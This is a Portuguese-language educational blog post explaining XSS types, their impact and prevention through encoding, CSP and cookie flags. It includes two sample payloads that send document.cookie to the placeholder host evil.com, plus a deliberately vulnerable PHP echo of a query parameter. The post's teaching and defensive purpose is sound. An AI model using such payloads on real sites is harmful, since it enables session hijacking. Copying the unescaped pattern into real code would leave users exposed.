---
layout: ../../../layouts/PostLayout.astro
title: "Cross-Site Scripting (XSS): O Clássico Que Não Envelhece"
description: "Entenda o que é XSS, como funciona na prática, qual o seu impacto real e como escrever código que não seja vulnerável a esse tipo de ataque."
date: "2024-06-10"
category: "Vulnerabilidades"
lang: "pt-BR"
---

## O Que é XSS?

**Cross-Site Scripting (XSS)** é uma classe de vulnerabilidade que permite a um atacante injetar scripts maliciosos em páginas web visualizadas por outros usuários. Apesar do nome conter "Cross-Site", a essência do ataque é a *injeção de código JavaScript* em contextos onde a aplicação deveria exibir apenas dados.

O XSS ocorre quando uma aplicação web:

1. Recebe dados de uma fonte não confiável (parâmetro de URL, formulário, cookie, etc.)
2. Inclui esses dados no HTML de resposta **sem sanitização adequada**
3. O navegador da vítima interpreta e executa o código injetado

---

## Tipos Principais

### Reflected XSS

O payload é enviado via requisição HTTP e refletido imediatamente na resposta. A vítima precisa ser induzida a clicar em um link malicioso.

```
https://alvo.com/busca?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

### Stored XSS

O payload é armazenado no banco de dados do servidor (comentário, perfil, mensagem) e exibido para outros usuários. É o tipo mais perigoso: sem precisar de um link especial, qualquer visita à página executa o código.

### DOM-based XSS

A vulnerabilidade existe no próprio JavaScript do cliente. O DOM é manipulado sem que o payload passe pelo servidor — ataques que bypassam WAFs configurados apenas no lado servidor.

---

## Exemplo Conceitual

Imagine um campo de busca que exibe a string pesquisada:

```html
<!-- Código vulnerável -->
<p>Você buscou por: <?= $_GET['q'] ?></p>
```

Um usuário mal-intencionado acessa:

```
/busca?q=<img src=x onerror="fetch('https://evil.com/?s='+document.cookie)">
```

O resultado renderizado no HTML da vítima será uma imagem inválida que, ao falhar, executa o código — exfiltrando os cookies de sessão silenciosamente.

---

## Impacto Real

XSS não é apenas "exibir um alert() na tela". Com JavaScript executando no contexto da origem alvo, um atacante pode:

- **Roubar sessões**: capturar cookies e tokens de autenticação
- **Keylogging**: registrar tudo que o usuário digita na página
- **Defacement**: alterar o conteúdo visual da página em tempo real
- **Redirecionamento**: enviar a vítima para páginas de phishing
- **CSRF encadeado**: realizar requisições autenticadas em nome da vítima
- **Exfiltração de dados**: ler conteúdo do DOM e enviar para servidor externo

> Em aplicações financeiras, médicas ou governamentais, uma vulnerabilidade XSS stored pode comprometer centenas de milhares de usuários simultaneamente.

---

## Como Prevenir

A prevenção eficaz exige defesa em profundidade:

**1. Encoding contextual de saída**

Codifique os dados antes de inseri-los no HTML. Use a função correta para cada contexto:

- HTML body → `htmlspecialchars()` (PHP) / `escapeHtml()`
- Atributo HTML → `htmlspecialchars($val, ENT_QUOTES)`
- JavaScript → `JSON.encode()` ou funções de escape dedicadas
- URL → `urlencode()`

**2. Content Security Policy (CSP)**

Implemente uma CSP restritiva via header HTTP para limitar as origens de scripts permitidos:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}';
```

**3. Flags de Cookie**

Proteja cookies de sessão com `HttpOnly` (inacessíveis via JS) e `Secure` (apenas HTTPS):

```
Set-Cookie: sessid=abc123; HttpOnly; Secure; SameSite=Strict
```

**4. Validação de entrada**

Valide e rejeite entradas que não correspondam ao formato esperado. Whitelist é preferível a blacklist.

**5. Frameworks modernos**

React, Vue e Angular fazem encoding automático por padrão. Nunca use `dangerouslySetInnerHTML`, `v-html` ou `innerHTML` com dados não confiáveis.

---

## Leitura Complementar

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — XSS](https://portswigger.net/web-security/cross-site-scripting)
- CWE-79: Improper Neutralization of Input During Web Page Generation
